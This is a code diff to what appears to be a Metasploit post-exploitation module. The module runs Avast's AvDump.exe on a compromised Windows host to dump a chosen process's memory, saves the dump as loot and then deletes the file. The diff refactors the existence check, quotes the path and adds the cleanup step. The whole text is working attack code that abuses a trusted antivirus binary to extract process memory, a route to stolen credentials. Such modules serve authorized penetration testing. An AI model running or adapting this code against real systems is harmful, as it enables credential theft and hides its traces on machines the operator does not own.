@@ -22,24 +22,27 @@ class MetasploitModule < Msf::Post
     ])
   end
 
-  def check_for_dump
-    if file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe")
-        print_status("AvDump.exe exists!")
-        return true
-    else
-        print_error("AvDump.exe does not exist on target.")
-        return false
-    end
-
+  def avdump_exists?
+    file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe")
   end
 
   def run
-    if check_for_dump
-        print_status("executing Avast mem dump utility against #{datastore['PID']} to #{datastore['DUMP_PATH']}")
-        result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{datastore['PID']} --exception_ptr 0 --thread_id 0 --dump_file #{datastore['DUMP_PATH']} --min_interval 0")
-        mem_file = read_file("#{datastore['DUMP_PATH']}")
-        store_loot("host.avast.memdump", "binary/db", session, mem_file)
-        print_status(result)
-    end
+
+    fail_with(Failure::NotVulnerable, 'AvDump.exe does not exist on target.') unless avdump_exists?
+    print_status('AvDump.exe exists!')
+
+    dump_path = datastore['DUMP_PATH'] 
+    pid = datastore['PID'].to_s
+
+    print_status("Executing Avast mem dump utility against #{pid} to #{dump_path}")
+    result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \"#{dump_path}\" --min_interval 0")
+
+    print_status(dump_path)
+    mem_file = read_file(dump_path)
+    store_loot("host.avast.memdump", "binary/db", session, mem_file)
+
+    print_status(result)
+    rm_f(dump_path)
+
   end
 end
